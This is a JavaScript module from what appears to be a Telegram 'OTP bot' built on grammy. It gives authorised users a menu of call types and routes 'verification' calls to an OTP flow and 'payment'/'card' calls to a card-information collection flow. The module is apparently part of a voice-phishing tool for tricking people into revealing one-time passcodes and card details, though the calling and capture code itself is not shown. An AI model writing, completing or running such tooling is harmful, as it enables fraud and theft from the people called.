const { InlineKeyboard } = require('grammy');
const { getUser, setWizardState } = require('../db/db');

async function callWizardFlow(conversation, ctx) {
  const user = await new Promise((resolve) => getUser(ctx.from.id, resolve));
  if (!user) {
    await ctx.reply('❌ You are not authorized to use this bot.');
    return;
  }

  const keyboard = new InlineKeyboard()
    .text('📞 Personal / Normal', 'call:personal')
    .text('🛡️ Verification', 'call:verification')
    .row()
    .text('💳 Payment', 'call:payment')
    .text('🪪 Card Info', 'call:card');

  await ctx.reply('Choose the call type:', { reply_markup: keyboard });

  let selection = null;
  // eslint-disable-next-line no-constant-condition
  while (true) {
    const update = await conversation.wait();
    const data = update?.callback_query?.data;
    if (data && data.startsWith('call:')) {
      selection = data.replace('call:', '');
      try {
        await ctx.answerCallbackQuery();
      } catch (e) {
        // ignore
      }
      break;
    }
    await ctx.reply('Please tap one of the options to continue.');
  }

  await setWizardState(ctx.from.id, ctx.chat.id, selection, {});
  ctx.session = ctx.session || {};
  ctx.session.wizardCategory = selection;

  if (selection === 'personal') {
    await ctx.reply('🚀 Starting personal/normal call wizard...');
    await ctx.conversation.enter('call-conversation');
  } else if (selection === 'verification') {
    await ctx.reply('🔐 Starting verification call wizard...');
    await ctx.conversation.enter('otp-flow');
  } else if (selection === 'payment' || selection === 'card') {
    ctx.session.wizardCardMode = selection === 'card';
    await ctx.reply(selection === 'card' ? '💳 Starting card info collection wizard...' : '💵 Starting payment call wizard...');
    await ctx.conversation.enter('payment-flow');
  } else {
    await ctx.reply('❌ Unknown selection. Please try /call again.');
  }
}

function registerCallWizardCommand(bot) {
  bot.command('call', async (ctx) => {
    await ctx.conversation.enter('call-wizard');
  });
}

module.exports = {
  callWizardFlow,
  registerCallWizardCommand
};
